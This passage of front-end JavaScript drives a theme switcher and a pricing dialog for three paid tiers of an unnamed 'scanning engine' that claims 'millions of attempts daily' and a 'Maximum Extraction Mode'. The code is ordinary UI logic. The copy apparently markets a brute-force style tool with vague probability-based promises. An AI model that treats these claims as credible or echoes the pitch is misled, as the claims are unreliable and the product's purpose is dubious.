  if (dashImg)  dashImg.src  = 'images/dashboard_' + variant + '.png';
  if (storeImg) storeImg.src = 'images/upgrade_' + variant + '.png';
}

_onDom(function(){
  var saved = window._currentTheme || 'black';
  if (saved && saved !== 'black') {
    document.body.classList.remove('theme-red','theme-green','theme-white');
    document.body.classList.add('theme-' + saved);
    updateTopbarIcons(saved);
    var dot = document.querySelector('.theme-dot[data-theme="' + saved + '"]');
    if (dot) {
      document.querySelectorAll('.theme-dot').forEach(function(d){ d.classList.remove('active'); });
      dot.classList.add('active');
    }
  }
});

var PLAN_INFO_DATA = {
  starter: {
    title: 'Starter Pack',
    subtitle: 'This is where it starts',
    img: 'images/h5shl.png',
    buyPrice: 99,
    btnClass: 'sa-plan-btn-starter',
    desc: 'Starter Pack is designed for those who want to test the system without overpaying, while still getting real performance. You get access to a stable scanning engine capable of processing millions of attempts daily.',
    features: [
      { icon: '⚡', text: 'Low-risk testing' },
      { icon: '🧠', text: 'Understanding how the engine behaves in real conditions' },
      { icon: '⚙️', text: 'Clean and simple setup' },
    ],
    btnBg: 'linear-gradient(135deg,#00e676,#69f0ae)',
    btnColor: '#051a0e',
  },
  pro: {
    title: 'Pro Hunter',
    subtitle: 'Portable Power Engine',
    img: 'images/0vytv.png',
    buyPrice: 149,
    desc: 'Full Mobile unlocks multi-network scanning and removes limitations, giving you the flexibility to run high-speed processes directly from your mobile device.',
    features: [
      { icon: '⚡', text: 'More coverage' },
      { icon: '🧠', text: 'Higher probability' },
      { icon: '📱', text: 'True mobility' },
    ],
    btnBg: 'linear-gradient(135deg,#22d3ee,#0ea5e9)',
    btnColor: '#fff',
  },
  full: {
    title: 'Full Edition',
    subtitle: 'Maximum Extraction Mode',
    img: 'images/sti21.png',
    buyPrice: 249,
    desc: 'The highest tier of performance available. Built for users who want full control and maximum output. Speed + Coverage = Probability',
    features: [
      { icon: '⚡', text: 'Unlimited attempts — fully scalable performance' },
      { icon: '🧠', text: 'Advanced thread control system (you control the speed)' },
      { icon: '🌐', text: 'Maximum network coverage for wider reach' },
    ],
    btnBg: 'linear-gradient(135deg,#f59e0b,#f97316)',
    btnColor: '#fff',
  },
};

function openPlanInfo(plan) {
  var data = PLAN_INFO_DATA[plan];
  if (!data) {
 return; }

  var overlay = document.getElementById('planInfoOverlay');
  var dialog  = document.getElementById('planInfoDialog');
  if (!overlay || !dialog) {
 return; }

  
  var el = function(id){ return document.getElementById(id); };
  if(el('planInfoImg'))    el('planInfoImg').src = data.img;
  if(el('planInfoImgBig')) el('planInfoImgBig').src = data.img;
  if(el('planInfoTitle'))    el('planInfoTitle').textContent    = data.title;
  if(el('planInfoSubtitle')) el('planInfoSubtitle').textContent = data.subtitle;
  if(el('planInfoDesc'))     el('planInfoDesc').textContent     = data.desc;

  var featEl = el('planInfoFeatures');
  if(featEl){
    featEl.innerHTML='';
    data.features.forEach(function(f){
      var row=document.createElement('div');
      row.style.cssText='display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);border-radius:11px;padding:11px 13px;';
      row.innerHTML='<span style="font-size:1rem;flex-shrink:0;">'+f.icon+'</span>'
        +'<span style="font-family:Outfit,sans-serif;font-size:.8rem;color:rgba(200,205,230,.8);line-height:1.4;">'+f.text+'</span>';
      featEl.appendChild(row);
    });
  }

  var buyBtn=el('planInfoBuyBtn');
  if(buyBtn){
    buyBtn.style.background=data.btnBg||'linear-gradient(135deg,#7c5cff,#00cfb4)';
    buyBtn.style.color=data.btnColor||'#fff';
    buyBtn.style.boxShadow='0 0 24px rgba(124,92,255,.4)';
    buyBtn.onclick=function(){ closePlanInfo(); setTimeout(function(){ openPaymentModal(data.buyPrice); },400); };
  }

  
  if(overlay.parentNode !== document.body) document.body.appendChild(overlay);
  if(dialog.parentNode  !== document.body) document.body.appendChild(dialog);

  
  overlay.style.cssText='position:fixed;inset:0;z-index:39998;background:rgba(0,0,0,.75);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);display:block;';

  
  dialog.style.cssText='position:fixed;top:50%;left:50%;z-index:39999;width:min(340px,90vw);max-height:82vh;overflow-y:auto;display:block;background:linear-gradient(160deg,rgba(14,10,32,.99),rgba(6,5,15,1));border-radius:22px;border:1px solid rgba(124,92,255,.35);box-shadow:0 24px 80px rgba(0,0,0,.8),0 0 0 1px rgba(124,92,255,.12) inset;transform:translate(-50%,-48%) scale(.88);opacity:0;transition:none;';
  document.body.style.overflow='hidden';
  void dialog.offsetWidth;
  dialog.style.transition='transform .3s cubic-bezier(.25,1,.4,1),opacity .22s ease';
  dialog.style.transform='translate(-50%,-48%) scale(1)';
  dialog.style.opacity='1';
}

function closePlanInfo() {
  var overlay=document.getElementById('planInfoOverlay');
  var dialog=document.getElementById('planInfoDialog');
  if(!dialog) return;
  dialog.style.transition='transform .22s ease-in,opacity .2s ease';
  dialog.style.transform='translate(-50%,-48%) scale(.88)';
  dialog.style.opacity='0';
  if(overlay){ overlay.style.transition='opacity .22s ease'; overlay.style.opacity='0'; }
  setTimeout(function(){
    if(overlay){ overlay.style.display='none'; overlay.style.opacity=''; overlay.style.transition=''; }
    dialog.style.display='none';
    dialog.style.transition='';
    document.body.style.overflow='';
  },320);
}